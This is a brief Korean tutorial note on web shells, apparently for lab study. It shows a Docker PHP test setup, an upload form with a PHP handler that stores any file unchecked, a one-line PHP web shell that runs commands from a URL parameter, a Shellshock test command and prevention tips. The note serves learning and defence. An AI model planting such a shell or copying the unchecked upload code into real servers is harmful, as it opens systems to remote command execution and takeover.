## web shell

해당 기법들은 개인용으로 참조하시기 바랍니다.

업로드 취약점을 통해 시스템에 명령을 내릴수 있는 코드를 칭하지만 내부적인 코드로 인해서 발생할수 있다.

해당 취약점이 발생되면 시스템에 원격으로 백도어를 심을수 있다.

대표적인 웹셀파일 r57.php 


# 시작하기


해당 파일시작하기

```
docker run --rm -p 80:80 -v <sourcePath>:/var/www/html php:7.2-apache
```


파일업로드 코드
```
<form enctype="multipart/form-data" action="fileAction.php" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="300000" />
    이 파일을 전송합니다: <input name="userfile" type="file" />
    <input type="submit" value="파일 전송" />
</form>
```


실제 파일의 업로드하는 코드
```
<?php

$uploaddir = '/var/www/html/uploads/';
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);

echo '<pre>';
if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
    echo "파일이 유효하고, 성공적으로 업로드 되었습니다.\n";
} else {
    print "파일 업로드 공격의 가능성이 있습니다!\n";
}

echo '자세한 디버깅 정보입니다:';
print_r($_FILES);

print "</pre>";

?>
```

취약점을 가진 php파일 업로드
```
<?php
echo shell_exec($_GET['cmd']);
?>
```


또한 root가아니여도 2014-6271(Shell Shock) 사태처럼 쉘취약점을 이용하여 root를 탈취 가능하다.

취약점 테스트 

```
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
```


## 예방법

- 웹 서버의 파일 업로드 취약점 제거
- 파일 업로드 폴더의 실행 제한
- 웹 서버의 실행을 root로 하지말기


## 참조

## https://null-byte.wonderhowto.com/how-to/exploit-shellshock-web-server-using-metasploit-0186084/